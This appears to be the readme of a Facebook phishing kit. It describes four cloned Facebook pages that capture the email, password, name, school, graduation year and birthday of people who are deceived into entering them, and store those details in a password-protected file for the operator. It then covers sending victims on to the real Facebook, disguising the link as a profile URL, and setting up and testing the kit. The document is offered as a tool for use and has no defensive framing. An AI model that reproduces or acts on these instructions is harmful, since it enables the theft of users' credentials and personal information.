What is this?
This Facebook phisher contains 4 pages that look similar to ones that you would see on Facebook.
(Main Page, Fake Profile, Login, Register)
Entering an email and password on these pages will save it to a file that only you have access to.
The user who entered his/her information will be redirected to a real Facebook page.

What does the Registration page do?
The Registration page saves the users Name, School, Graduation Year, Birthday, Email, and Password.

Where are the passwords stored?
profile607264287loginlogin.cgi
The default Username and Password is admin.
To change this, edit profile607264287login.htpasswd  <a href="
http://home.flash.net/cgi-bin/pw.pl" rel="nofollow" target="_NEW">
http://home.flash.net/cgi-bin/pw.pl</a>
One login per line.

What are the php files for?
The php files simply redirect the user to a .htm file. It looks much better in a link.
Using profile.php as http://www.mysite.com/profile.php?id=607264287 is a good disguise.

Can I change the name in the fake profile?
Yes you can. Just open profile607264287index.htm and change whatever you want.

3) Edit the files in profile607264287login to properly password protect login.cgi.
4) Check to see if everything works (see below).

Login:		/login.htm

1) Go to all of these pages and type in an Email and Password.

2) Go to profile607264287loginlogin.cgi to view the information you typed in.
